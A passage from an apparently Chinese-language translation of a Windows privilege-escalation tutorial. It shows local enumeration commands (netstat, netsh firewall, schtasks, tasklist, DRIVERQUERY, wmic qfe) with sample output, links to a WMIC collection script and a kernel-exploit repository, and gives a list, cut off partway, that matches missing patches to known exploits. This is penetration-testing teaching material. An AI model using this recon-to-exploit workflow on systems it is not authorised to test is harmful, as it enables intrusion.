On-link</div><div class="line">  1    306 ff00::/8                 On-link</div><div class="line"> 14    306 ff00::/8                 On-link</div><div class="line"> 11    266 ff00::/8                 On-link</div><div class="line">===========================================================================</div><div class="line">Persistent Routes:</div><div class="line">  None</div><div class="line">  </div><div class="line"># arp -A displays the ARP (Address Resolution Protocol) cache table for all available interfaces.</div><div class="line"></div><div class="line">C:\Windows\system32&gt; arp -A</div><div class="line"></div><div class="line">Interface: 192.168.0.104 --- 0xb</div><div class="line">  Internet Address      Physical Address      Type</div><div class="line">  192.168.0.1           90-94-e4-c5-b0-46     dynamic</div><div class="line">  192.168.0.101         ac-22-0b-af-bb-43     dynamic</div><div class="line">  192.168.0.255         ff-ff-ff-ff-ff-ff     static</div><div class="line">  224.0.0.22            01-00-5e-00-00-16     static</div><div class="line">  224.0.0.251           01-00-5e-00-00-fb     static</div><div class="line">  224.0.0.252           01-00-5e-00-00-fc     static</div><div class="line">  239.255.255.250       01-00-5e-7f-ff-fa     static</div><div class="line">  255.255.255.255       ff-ff-ff-ff-ff-ff     static</div></pre></td></tr></table></figure>
<h4 id="下面使用netstat-命令查看主机的网络连接和防火墙规则"><a href="#下面使用netstat-命令查看主机的网络连接和防火墙规则" class="headerlink" title="下面使用netstat 命令查看主机的网络连接和防火墙规则"></a>下面使用netstat 命令查看主机的网络连接和防火墙规则</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div></pre></td><td class="code"><pre><div class="line">C:\Windows\system32&gt; netstat -ano</div><div class="line"></div><div class="line">Active Connections</div><div class="line"></div><div class="line">  Proto  Local Address          Foreign Address        State           PID</div><div class="line">  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       684</div><div class="line">  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4</div><div class="line">  TCP    0.0.0.0:5357           0.0.0.0:0              LISTENING       4</div><div class="line">  TCP    127.0.0.1:5354         0.0.0.0:0              LISTENING       1400</div><div class="line">  TCP    192.168.0.104:139      0.0.0.0:0              LISTENING       4</div><div class="line">  TCP    [::]:135               [::]:0                 LISTENING       684</div><div class="line">  TCP    [::]:445               [::]:0                 LISTENING       4</div><div class="line">  TCP    [::]:5357              [::]:0                 LISTENING       4</div><div class="line">  UDP    0.0.0.0:5355           *:*                                    1100</div><div class="line">  UDP    0.0.0.0:52282          *:*                                    976</div><div class="line">  UDP    0.0.0.0:55202          *:*                                    2956</div><div class="line">  UDP    0.0.0.0:59797          *:*                                    1400</div><div class="line">  UDP    127.0.0.1:1900         *:*                                    2956</div><div class="line">  UDP    127.0.0.1:65435        *:*                                    2956</div><div class="line">  UDP    192.168.0.104:137      *:*                                    4</div><div class="line">  UDP    192.168.0.104:138      *:*                                    4</div><div class="line">  UDP    192.168.0.104:1900     *:*                                    2956</div><div class="line">  UDP    192.168.0.104:5353     *:*                                    1400</div><div class="line">  UDP    192.168.0.104:65434    *:*                                    2956</div><div class="line">  UDP    [::]:5355              *:*                                    1100</div><div class="line">  UDP    [::]:52281             *:*                                    976</div><div class="line">  UDP    [::]:52283             *:*                                    976</div><div class="line">  UDP    [::]:55203             *:*                                    2956</div><div class="line">  UDP    [::]:59798             *:*                                    1400</div><div class="line">  UDP    [::1]:1900             *:*                                    2956</div><div class="line">  UDP    [::1]:5353             *:*                                    1400</div><div class="line">  UDP    [::1]:65433            *:*                                    2956</div><div class="line">  UDP    [fe80::5cd4:9caf:61c0:ba6e%11]:1900  *:*                      2956</div><div class="line">  UDP    [fe80::5cd4:9caf:61c0:ba6e%11]:65432  *:*                     2956</div><div class="line">  </div><div class="line"># The following two netsh commands are examples of commands that are not universal across OS/SP. The netsh</div><div class="line">firewall commands are only available from XP SP2 and upwards.</div><div class="line"></div><div class="line">C:\Windows\system32&gt; netsh firewall show state</div><div class="line"></div><div class="line">Firewall status:</div><div class="line">-------------------------------------------------------------------</div><div class="line">Profile                           = Standard</div><div class="line">Operational mode                  = Enable</div><div class="line">Exception mode                    = Enable</div><div class="line">Multicast/broadcast response mode = Enable</div><div class="line">Notification mode                 = Enable</div><div class="line">Group policy version              = Windows Firewall</div><div class="line">Remote admin mode                 = Disable</div><div class="line"></div><div class="line">Ports currently open on all network interfaces:</div><div class="line">Port   Protocol  Version  Program</div><div class="line">-------------------------------------------------------------------</div><div class="line">No ports are currently open on all network interfaces.</div><div class="line"></div><div class="line">C:\Windows\system32&gt; netsh firewall show config</div><div class="line"></div><div class="line">Domain profile configuration:</div><div class="line">-------------------------------------------------------------------</div><div class="line">Operational mode                  = Enable</div><div class="line">Exception mode                    = Enable</div><div class="line">Multicast/broadcast response mode = Enable</div><div class="line">Notification mode                 = Enable</div><div class="line"></div><div class="line">Allowed programs configuration for Domain profile:</div><div class="line">Mode     Traffic direction    Name / Program</div><div class="line">-------------------------------------------------------------------</div><div class="line"></div><div class="line">Port configuration for Domain profile:</div><div class="line">Port   Protocol  Mode    Traffic direction     Name</div><div class="line">-------------------------------------------------------------------</div><div class="line"></div><div class="line">ICMP configuration for Domain profile:</div><div class="line">Mode     Type  Description</div><div class="line">-------------------------------------------------------------------</div><div class="line">Enable   2     Allow outbound packet too big</div><div class="line"></div><div class="line">Standard profile configuration (current):</div><div class="line">-------------------------------------------------------------------</div><div class="line">Operational mode                  = Enable</div><div class="line">Exception mode                    = Enable</div><div class="line">Multicast/broadcast response mode = Enable</div><div class="line">Notification mode                 = Enable</div><div class="line"></div><div class="line">Service configuration for Standard profile:</div><div class="line">Mode     Customized  Name</div><div class="line">-------------------------------------------------------------------</div><div class="line">Enable   No          Network Discovery</div><div class="line"></div><div class="line">Allowed programs configuration for Standard profile:</div><div class="line">Mode     Traffic direction    Name / Program</div><div class="line">-------------------------------------------------------------------</div><div class="line">Enable   Inbound              COMRaider / E:\comraider\comraider.exe</div><div class="line">Enable   Inbound              nc.exe / C:\users\b33f\desktop\nc.exe</div><div class="line"></div><div class="line">Port configuration for Standard profile:</div><div class="line">Port   Protocol  Mode    Traffic direction     Name</div><div class="line">-------------------------------------------------------------------</div><div class="line"></div><div class="line">ICMP configuration for Standard profile:</div><div class="line">Mode     Type  Description</div><div class="line">-------------------------------------------------------------------</div><div class="line">Enable   2     Allow outbound packet too big</div><div class="line"></div><div class="line">Log configuration:</div><div class="line">-------------------------------------------------------------------</div><div class="line">File location   = C:\Windows\system32\LogFiles\Firewall\pfirewall.log</div><div class="line">Max file size   = 4096 KB</div><div class="line">Dropped packets = Disable</div><div class="line">Connections     = Disable</div></pre></td></tr></table></figure>
<h4 id="最后我们简单的看看主机运行的内容：计划任务、正在运行的进程、已经启动的服务和已经安装的驱动"><a href="#最后我们简单的看看主机运行的内容：计划任务、正在运行的进程、已经启动的服务和已经安装的驱动" class="headerlink" title="最后我们简单的看看主机运行的内容：计划任务、正在运行的进程、已经启动的服务和已经安装的驱动"></a>最后我们简单的看看主机运行的内容：计划任务、正在运行的进程、已经启动的服务和已经安装的驱动</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div></pre></td><td class="code"><pre><div class="line"># This will display verbose output for all scheduled tasks, below you can see sample output for a</div><div class="line">single task.</div><div class="line"></div><div class="line">C:\Windows\system32&gt; schtasks /query /fo LIST /v</div><div class="line"></div><div class="line">Folder: \Microsoft\Windows Defender</div><div class="line">HostName:                             B33F</div><div class="line">TaskName:                             \Microsoft\Windows Defender\MP Scheduled Scan</div><div class="line">Next Run Time:                        1/22/2014 5:11:13 AM</div><div class="line">Status:                               Ready</div><div class="line">Logon Mode:                           Interactive/Background</div><div class="line">Last Run Time:                        N/A</div><div class="line">Last Result:                          1</div><div class="line">Author:                               N/A</div><div class="line">Task To Run:                          c:\program files\windows defender\MpCmdRun.exe Scan -ScheduleJob</div><div class="line">                                      -WinTask -RestrictPrivilegesScan</div><div class="line">Start In:                             N/A</div><div class="line">Comment:                              Scheduled Scan</div><div class="line">Scheduled Task State:                 Enabled</div><div class="line">Idle Time:                            Only Start If Idle for 1 minutes, If Not Idle Retry For 240 minutes</div><div class="line">Power Management:                     No Start On Batteries</div><div class="line">Run As User:                          SYSTEM</div><div class="line">Delete Task If Not Rescheduled:       Enabled</div><div class="line">Stop Task If Runs X Hours and X Mins: 72:00:00</div><div class="line">Schedule:                             Scheduling data is not available in this format.</div><div class="line">Schedule Type:                        Daily</div><div class="line">Start Time:                           5:11:13 AM</div><div class="line">Start Date:                           1/1/2000</div><div class="line">End Date:                             1/1/2100</div><div class="line">Days:                                 Every 1 day(s)</div><div class="line">Months:                               N/A</div><div class="line">Repeat: Every:                        Disabled</div><div class="line">Repeat: Until: Time:                  Disabled</div><div class="line">Repeat: Until: Duration:              Disabled</div><div class="line">Repeat: Stop If Still Running:        Disabled</div><div class="line">[..Snip..]</div><div class="line"></div><div class="line"># The following command links running processes to started services.</div><div class="line"></div><div class="line">C:\Windows\system32&gt; tasklist /SVC</div><div class="line"></div><div class="line">Image Name                     PID Services</div><div class="line">========================= ======== ============================================</div><div class="line">System Idle Process              0 N/A</div><div class="line">System                           4 N/A</div><div class="line">smss.exe                       244 N/A</div><div class="line">csrss.exe                      332 N/A</div><div class="line">csrss.exe                      372 N/A</div><div class="line">wininit.exe                    380 N/A</div><div class="line">winlogon.exe                   428 N/A</div><div class="line">services.exe                   476 N/A</div><div class="line">lsass.exe                      484 SamSs</div><div class="line">lsm.exe                        496 N/A</div><div class="line">svchost.exe                    588 DcomLaunch, PlugPlay, Power</div><div class="line">svchost.exe                    668 RpcEptMapper, RpcSs</div><div class="line">svchost.exe                    760 Audiosrv, Dhcp, eventlog,</div><div class="line">                                   HomeGroupProvider, lmhosts, wscsvc</div><div class="line">svchost.exe                    800 AudioEndpointBuilder, CscService, Netman,</div><div class="line">                                   SysMain, TrkWks, UxSms, WdiSystemHost,</div><div class="line">                                   wudfsvc</div><div class="line">svchost.exe                    836 AeLookupSvc, BITS, gpsvc, iphlpsvc,</div><div class="line">                                   LanmanServer, MMCSS, ProfSvc, Schedule,</div><div class="line">                                   seclogon, SENS, ShellHWDetection, Themes,</div><div class="line">                                   Winmgmt, wuauserv</div><div class="line">audiodg.exe                    916 N/A</div><div class="line">svchost.exe                    992 EventSystem, fdPHost, netprofm, nsi,</div><div class="line">                                   WdiServiceHost, WinHttpAutoProxySvc</div><div class="line">svchost.exe                   1104 CryptSvc, Dnscache, LanmanWorkstation,</div><div class="line">                                   NlaSvc</div><div class="line">spoolsv.exe                   1244 Spooler</div><div class="line">svchost.exe                   1272 BFE, DPS, MpsSvc</div><div class="line">mDNSResponder.exe             1400 Bonjour Service</div><div class="line">taskhost.exe                  1504 N/A</div><div class="line">taskeng.exe                   1556 N/A</div><div class="line">vmtoolsd.exe                  1580 VMTools</div><div class="line">dwm.exe                       1660 N/A</div><div class="line">explorer.exe                  1668 N/A</div><div class="line">vmware-usbarbitrator.exe      1768 VMUSBArbService</div><div class="line">TPAutoConnSvc.exe             1712 TPAutoConnSvc</div><div class="line">[..Snip..]</div><div class="line"></div><div class="line">C:\Windows\system32&gt; net start</div><div class="line"></div><div class="line">These Windows services are started:</div><div class="line"></div><div class="line">   Application Experience</div><div class="line">   Application Information</div><div class="line">   Background Intelligent Transfer Service</div><div class="line">   Base Filtering Engine</div><div class="line">   Bluetooth Support Service</div><div class="line">   Bonjour Service</div><div class="line">   COM+ Event System</div><div class="line">   COM+ System Application</div><div class="line">   Cryptographic Services</div><div class="line">   DCOM Server Process Launcher</div><div class="line">   Desktop Window Manager Session Manager</div><div class="line">   DHCP Client</div><div class="line">   Diagnostic Policy Service</div><div class="line">   Diagnostic Service Host</div><div class="line">   Diagnostic System Host</div><div class="line">   Distributed Link Tracking Client</div><div class="line">   Distributed Transaction Coordinator</div><div class="line">   DNS Client</div><div class="line">   Function Discovery Provider Host</div><div class="line">   Function Discovery Resource Publication</div><div class="line">   Group Policy Client</div><div class="line">[..Snip..]</div><div class="line">   </div><div class="line"># This can be useful sometimes as some 3rd party drivers, even by reputable companies, contain more holes</div><div class="line">than Swiss cheese. This is only possible because ring0 exploitation lies outside most peoples expertise.</div><div class="line"></div><div class="line">C:\Windows\system32&gt; DRIVERQUERY</div><div class="line"></div><div class="line">Module Name  Display Name           Driver Type   Link Date</div><div class="line">============ ====================== ============= ======================</div><div class="line">1394ohci     1394 OHCI Compliant Ho Kernel        11/20/2010 6:01:11 PM</div><div class="line">ACPI         Microsoft ACPI Driver  Kernel        11/20/2010 4:37:52 PM</div><div class="line">AcpiPmi      ACPI Power Meter Drive Kernel        11/20/2010 4:47:55 PM</div><div class="line">adp94xx      adp94xx                Kernel        12/6/2008 7:59:55 AM</div><div class="line">adpahci      adpahci                Kernel        5/2/2007 1:29:26 AM</div><div class="line">adpu320      adpu320                Kernel        2/28/2007 8:03:08 AM</div><div class="line">AFD          Ancillary Function Dri Kernel        11/20/2010 4:40:00 PM</div><div class="line">agp440       Intel AGP Bus Filter   Kernel        7/14/2009 7:25:36 AM</div><div class="line">aic78xx      aic78xx                Kernel        4/12/2006 8:20:11 AM</div><div class="line">aliide       aliide                 Kernel        7/14/2009 7:11:17 AM</div><div class="line">amdagp       AMD AGP Bus Filter Dri Kernel        7/14/2009 7:25:36 AM</div><div class="line">amdide       amdide                 Kernel        7/14/2009 7:11:19 AM</div><div class="line">AmdK8        AMD K8 Processor Drive Kernel        7/14/2009 7:11:03 AM</div><div class="line">AmdPPM       AMD Processor Driver   Kernel        7/14/2009 7:11:03 AM</div><div class="line">amdsata      amdsata                Kernel        3/19/2010 9:08:27 AM</div><div class="line">amdsbs       amdsbs                 Kernel        3/21/2009 2:35:26 AM</div><div class="line">amdxata      amdxata                Kernel        3/20/2010 12:19:01 AM</div><div class="line">AppID        AppID Driver           Kernel        11/20/2010 5:29:48 PM</div><div class="line">arc          arc                    Kernel        5/25/2007 5:31:06 AM</div><div class="line">[..Snip..]</div></pre></td></tr></table></figure>
<h2 id="Δt-for-t4-The-Arcane-Arts-Of-WMIC"><a href="#Δt-for-t4-The-Arcane-Arts-Of-WMIC" class="headerlink" title="Δt for t4 - The Arcane Arts Of WMIC"></a>Δt for t4 - The Arcane Arts Of WMIC</h2><h4 id="我想要单独提及一下WMIC-Windows-Management-Instrumentation-Command-Line-，因为它是Windows最有用的命令行工具。WMIC-对于信息收集和后渗透来说非常有用。不过这个工具比较重量级，所以不会一一介绍它的所有功能。"><a href="#我想要单独提及一下WMIC-Windows-Management-Instrumentation-Command-Line-，因为它是Windows最有用的命令行工具。WMIC-对于信息收集和后渗透来说非常有用。不过这个工具比较重量级，所以不会一一介绍它的所有功能。" class="headerlink" title="我想要单独提及一下WMIC (Windows Management Instrumentation Command-Line) ，因为它是Windows最有用的命令行工具。WMIC 对于信息收集和后渗透来说非常有用。不过这个工具比较重量级，所以不会一一介绍它的所有功能。"></a>我想要单独提及一下WMIC (Windows Management Instrumentation Command-Line) ，因为它是Windows最有用的命令行工具。WMIC 对于信息收集和后渗透来说非常有用。不过这个工具比较重量级，所以不会一一介绍它的所有功能。</h4><h4 id="下面链接有关于它的详细使用教程，有兴趣的可以去自己翻译看看："><a href="#下面链接有关于它的详细使用教程，有兴趣的可以去自己翻译看看：" class="headerlink" title="下面链接有关于它的详细使用教程，有兴趣的可以去自己翻译看看："></a>下面链接有关于它的详细使用教程，有兴趣的可以去自己翻译看看：</h4><ul>
<li>Windows WMIC Command Line (ComputerHope) - <a href="https://www.computerhope.com/wmic.htm" target="_blank" rel="external">here</a></li>
</ul>
<h4 id="令人遗憾的是有些Windows的默认配置不允许使用WMIC，除非用户是在管理员组里面。从对VMIC-的测试中我注意到任何版本的XP-系统都不允许低权限账号使用WMIC。相反，默认安装的Windows-7-Professional-和Windows-8-企业版却允许使用低权限账号使用WMIC-来查询系统信息而不需要修改任何设置。惊不惊喜，意不意外？"><a href="#令人遗憾的是有些Windows的默认配置不允许使用WMIC，除非用户是在管理员组里面。从对VMIC-的测试中我注意到任何版本的XP-系统都不允许低权限账号使用WMIC。相反，默认安装的Windows-7-Professional-和Windows-8-企业版却允许使用低权限账号使用WMIC-来查询系统信息而不需要修改任何设置。惊不惊喜，意不意外？" class="headerlink" title="令人遗憾的是有些Windows的默认配置不允许使用WMIC，除非用户是在管理员组里面。从对VMIC 的测试中我注意到任何版本的XP 系统都不允许低权限账号使用WMIC。相反，默认安装的Windows 7 Professional 和Windows 8 企业版却允许使用低权限账号使用WMIC 来查询系统信息而不需要修改任何设置。惊不惊喜，意不意外？"></a>令人遗憾的是有些Windows的默认配置不允许使用WMIC，除非用户是在管理员组里面。从对VMIC 的测试中我注意到任何版本的XP 系统都不允许低权限账号使用WMIC。相反，默认安装的Windows 7 Professional 和Windows 8 企业版却允许使用低权限账号使用WMIC 来查询系统信息而不需要修改任何设置。惊不惊喜，意不意外？</h4><h4 id="为了简化操作，贡献社会，方便大家，我写了一个自动化脚本，它将利用VMIC-收集以下信息：进程，服务，用户帐户，用户组，网络接口，硬盘驱动器信息，网络共享信息，已安装的Windows-补丁程序，启动时运行的程序，已安装软件列表，操作系统和时区信息。"><a href="#为了简化操作，贡献社会，方便大家，我写了一个自动化脚本，它将利用VMIC-收集以下信息：进程，服务，用户帐户，用户组，网络接口，硬盘驱动器信息，网络共享信息，已安装的Windows-补丁程序，启动时运行的程序，已安装软件列表，操作系统和时区信息。" class="headerlink" title="为了简化操作，贡献社会，方便大家，我写了一个自动化脚本，它将利用VMIC 收集以下信息：进程，服务，用户帐户，用户组，网络接口，硬盘驱动器信息，网络共享信息，已安装的Windows 补丁程序，启动时运行的程序，已安装软件列表，操作系统和时区信息。"></a>为了简化操作，贡献社会，方便大家，我写了一个自动化脚本，它将利用VMIC 收集以下信息：进程，服务，用户帐户，用户组，网络接口，硬盘驱动器信息，网络共享信息，已安装的Windows 补丁程序，启动时运行的程序，已安装软件列表，操作系统和时区信息。</h4><h4 id="你可以从这里下载我的脚本"><a href="#你可以从这里下载我的脚本" class="headerlink" title="你可以从这里下载我的脚本"></a>你可以从这里<a href="http://www.fuzzysecurity.com/tutorials/files/wmic_info.rar" target="_blank" rel="external">下载我的脚本</a></h4><h4 id="你也可以从这里下载我利用脚本收集的信息样本"><a href="#你也可以从这里下载我利用脚本收集的信息样本" class="headerlink" title="你也可以从这里下载我利用脚本收集的信息样本"></a>你也可以从这里下载我利用脚本收集的<a href="http://www.fuzzysecurity.com/tutorials/files/Win7.html" target="_blank" rel="external">信息样本</a></h4><h2 id="Δt-for-t5-to-t6-Quick-Fails"><a href="#Δt-for-t5-to-t6-Quick-Fails" class="headerlink" title="Δt for t5 to t6 - Quick Fails"></a>Δt for t5 to t6 - Quick Fails</h2><h4 id="继续后续步骤之前，你应该花一点时间回顾以下刚才所收集到的信息，因为现在我们已经得到操作系统大量的有用信息了"><a href="#继续后续步骤之前，你应该花一点时间回顾以下刚才所收集到的信息，因为现在我们已经得到操作系统大量的有用信息了" class="headerlink" title="继续后续步骤之前，你应该花一点时间回顾以下刚才所收集到的信息，因为现在我们已经得到操作系统大量的有用信息了."></a>继续后续步骤之前，你应该花一点时间回顾以下刚才所收集到的信息，因为现在我们已经得到操作系统大量的有用信息了.</h4><h4 id="尽管已经通过我的WMIC-脚本收集到主机的补丁信息了，但是我们仍然可以通过下面的命令来手动收集。"><a href="#尽管已经通过我的WMIC-脚本收集到主机的补丁信息了，但是我们仍然可以通过下面的命令来手动收集。" class="headerlink" title="尽管已经通过我的WMIC 脚本收集到主机的补丁信息了，但是我们仍然可以通过下面的命令来手动收集。"></a>尽管已经通过我的WMIC 脚本收集到主机的补丁信息了，但是我们仍然可以通过下面的命令来手动收集。</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">C:\Windows\system32&gt; wmic qfe get Caption,Description,HotFixID,InstalledOn</div><div class="line"></div><div class="line">Caption                                     Description      HotFixID   InstalledOn</div><div class="line">http://support.microsoft.com/?kbid=2727528  Security Update  KB2727528  11/23/2013</div><div class="line">http://support.microsoft.com/?kbid=2729462  Security Update  KB2729462  11/26/2013</div><div class="line">http://support.microsoft.com/?kbid=2736693  Security Update  KB2736693  11/26/2013</div><div class="line">http://support.microsoft.com/?kbid=2737084  Security Update  KB2737084  11/23/2013</div><div class="line">http://support.microsoft.com/?kbid=2742614  Security Update  KB2742614  11/23/2013</div><div class="line">http://support.microsoft.com/?kbid=2742616  Security Update  KB2742616  11/26/2013</div><div class="line">http://support.microsoft.com/?kbid=2750149  Update           KB2750149  11/23/2013</div><div class="line">http://support.microsoft.com/?kbid=2756872  Update           KB2756872  11/24/2013</div><div class="line">http://support.microsoft.com/?kbid=2756923  Security Update  KB2756923  11/26/2013</div><div class="line">http://support.microsoft.com/?kbid=2757638  Security Update  KB2757638  11/23/2013</div><div class="line">http://support.microsoft.com/?kbid=2758246  Update           KB2758246  11/24/2013</div><div class="line">http://support.microsoft.com/?kbid=2761094  Update           KB2761094  11/24/2013</div><div class="line">http://support.microsoft.com/?kbid=2764870  Update           KB2764870  11/24/2013</div><div class="line">http://support.microsoft.com/?kbid=2768703  Update           KB2768703  11/23/2013</div><div class="line">http://support.microsoft.com/?kbid=2769034  Update           KB2769034  11/23/2013</div><div class="line">http://support.microsoft.com/?kbid=2769165  Update           KB2769165  11/23/2013</div><div class="line">http://support.microsoft.com/?kbid=2769166  Update           KB2769166  11/26/2013</div><div class="line">http://support.microsoft.com/?kbid=2770660  Security Update  KB2770660  11/23/2013</div><div class="line">http://support.microsoft.com/?kbid=2770917  Update           KB2770917  11/24/2013</div><div class="line">http://support.microsoft.com/?kbid=2771821  Update           KB2771821  11/24/2013</div><div class="line">[..Snip..]</div></pre></td></tr></table></figure>
<h4 id="提权的EXP-就那么几个，可以查看一下系统是否打有相关漏洞的补丁，没打补丁就嘿嘿嘿了，常见的EXP有这些-，大家可以下载对应版本的Windows-试试这些EXP。"><a href="#提权的EXP-就那么几个，可以查看一下系统是否打有相关漏洞的补丁，没打补丁就嘿嘿嘿了，常见的EXP有这些-，大家可以下载对应版本的Windows-试试这些EXP。" class="headerlink" title="提权的EXP 就那么几个，可以查看一下系统是否打有相关漏洞的补丁，没打补丁就嘿嘿嘿了，常见的EXP有这些:，大家可以下载对应版本的Windows 试试这些EXP。"></a>提权的EXP 就那么几个，可以查看一下系统是否打有相关漏洞的补丁，没打补丁就嘿嘿嘿了，<a href="https://github.com/SecWiki/windows-kernel-exploits" target="_blank" rel="external">常见的EXP有这些:</a>，大家可以下载对应版本的Windows 试试这些EXP。</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div></pre></td><td class="code"><pre><div class="line">#Security Bulletin   #KB     #Description    #Operating System  </div><div class="line">MS17-017 　[KB4013081]　　[GDI Palette Objects Local Privilege Escalation]　　(windows 7/8)</div><div class="line">CVE-2017-8464 　[LNK Remote Code Execution Vulnerability]　　(windows 10/8.1/7/2016/2010/2008)</div><div class="line">CVE-2017-0213 　[Windows COM Elevation of Privilege Vulnerability]　　(windows 10/8.1/7/2016/2010/2008)</div><div class="line">CVE-2018-0833   [SMBv3 Null Pointer Dereference Denial of Service]    (Windows 8.1/Server 2012 R2)</div><div class="line">MS17-010 　[KB4013389]　　[Windows Kernel Mode Drivers]　　(windows 7/2008/2003/XP)</div><div class="line">MS16-135 　[KB3199135]　　[Windows Kernel Mode Drivers]　　(2016)</div><div class="line">MS16-111 　[KB3186973]　　[kernel api]　　(Windows 10 10586 (32/64)/8.1)</div><div class="line">MS16-098 　[KB3178466]　　[Kernel Driver]　　(Win 8.1)</div><div class="line">MS16-075 　[KB3164038]　　[Hot Potato]　　(2003/2008/7/8/2012)</div><div class="line">MS16-034 　[KB3143145]　　[Kernel Driver]　　(2008/7/8/10/2012)</div><div class="line">MS16-032 　[KB3143141]　　[Secondary Logon Handle]　　(2008/7/8/10/2012)</div><div class="line">MS16-016 　[KB3136041]　　[WebDAV]　　(2008/Vista/7)</div><div class="line">MS16-014 　[K3134228]　　[remote code execution]　　(2008/Vista/7)</div><div class="line">MS15-097 　[KB3089656]　　[remote code execution]　　(win8.1/2012)</div><div class="line">MS15-076 　[KB3067505]　　[RPC]　　